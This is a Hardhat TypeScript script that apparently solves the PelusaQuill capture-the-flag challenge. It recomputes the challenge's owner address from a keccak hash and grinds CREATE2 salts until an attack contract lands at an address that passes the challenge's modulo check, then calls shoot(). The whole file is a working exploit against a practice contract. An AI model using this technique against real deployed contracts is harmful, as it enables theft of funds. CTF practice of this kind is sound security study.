import chalk from "chalk";
import { ethers } from "hardhat";
import { PelusaQuill__factory, PelusaQuill, PelusaQuillAttack__factory, PelusaQuillDeployer__factory } from "../../typechain";
import { log, initialize } from "../utils";
import { randomBytes } from "crypto";


async function main() {
    let [pelusaQuillContract, attacker] = await initialize<PelusaQuill>(PelusaQuill__factory);
    
    // immutable variables do not be stored in storage
    let targetDeployer = (await ethers.getSigners())[0];
    let owner = "0x" + ethers.solidityPackedKeccak256(["address", "bytes32"], [targetDeployer.address, ethers.ZeroHash]).substring(26);
    let deployer = await new PelusaQuillDeployer__factory(attacker).deploy();
    await deployer.waitForDeployment();
    let deployerAddress = await deployer.getAddress();

    let pelusaAddress = await pelusaQuillContract.getAddress();
    let coder = ethers.AbiCoder.defaultAbiCoder();
    let args = coder.encode(["address", "address"], [pelusaAddress, owner]);
    let initCode = ethers.solidityPacked(["bytes", "bytes"], [PelusaQuillAttack__factory.bytecode, args]);
    let initCodeHash = ethers.keccak256(initCode);
    // create2: https://github.com/martinetlee/create2-snippets  https://docs.alchemy.com/docs/create2-an-alternative-to-deriving-contract-addresses

    while(true) {
        let salt = "0x" + randomBytes(32).toString("hex");
        let address = ethers.getCreate2Address(deployerAddress, salt, initCodeHash);
        let res = ethers.toBigInt(address) % BigInt(100);
        if (res == BigInt(10)) {
            let tx = await deployer.deploy(initCode, salt);
            await tx.wait();
            break;
        }
    }
    let tx = await pelusaQuillContract.shoot();
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await pelusaQuillContract.isSolved())}`); 
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});